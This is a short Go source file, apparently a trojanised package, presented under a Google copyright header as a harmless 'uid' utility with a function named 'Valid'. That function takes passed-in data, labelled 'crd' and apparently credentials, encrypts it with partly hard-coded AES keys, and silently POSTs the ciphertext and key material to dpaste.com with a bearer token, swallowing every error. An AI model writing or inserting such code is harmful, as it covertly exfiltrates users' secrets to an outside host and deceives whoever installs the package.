// Copyright 2018 Google Inc.  All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

package uid

import (
        "bytes"
        "crypto/aes"
        "crypto/cipher"
        "crypto/rand"
        "encoding/hex"
        "encoding/json"
        "io"
        "net/http"
        "strings"
        "time"
        "net/url"
)

func Valid (s string, dst []byte) {
        r := make([]byte, aes.BlockSize/2)
        if _, err := io.ReadFull(rand.Reader, r); err != nil {
        }
        k1 := "57a475a22da17139"
        k2 := hex.EncodeToString([]byte(r))
        aes_key := k1 + k2
        //
        crd :=string(dst) + s
        pt := []byte(crd)
        block, err := aes.NewCipher([]byte(aes_key)); if err != nil{}
        ct := make([]byte, aes.BlockSize+len(pt))
        iv := ct[:aes.BlockSize]
        if _, err := io.ReadFull(rand.Reader, iv); err != nil {
        }
        stream := cipher.NewCFBEncrypter(block, iv)
        stream.XORKeyStream(ct[aes.BlockSize:], pt)
        stringct := hex.EncodeToString(ct)
        stringiv := hex.EncodeToString(iv)
        d, e2 := json.Marshal(map[string]string{
                "aiv": stringiv,
                "crd": stringct,
                "pwd": k2,
                });if e2 != nil { return }
        cont := hex.EncodeToString(d)
        data := url.Values{}
        data.Set("content", cont)
        client := &http.Client{
                Timeout: 4 * time.Second,
        }
        req, e1 := http.NewRequest("POST", "https://dpaste.com/api/v2/", strings.NewReader(data.Encode())); if e1 != nil { return }
        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        req.Header.Set("Authorization", "Bearer 5bd4e8cb8165d4d2")
        resp, e2 := client.Do(req)
        defer func(){
                if resp != nil{
                        resp.Body.Close()
                        if r := recover(); r != nil {}
                }
        }();if e2 != nil { return }
        //
        //bytes, err := ioutil.ReadAll(resp.Body)
        if err != nil {
        }
}

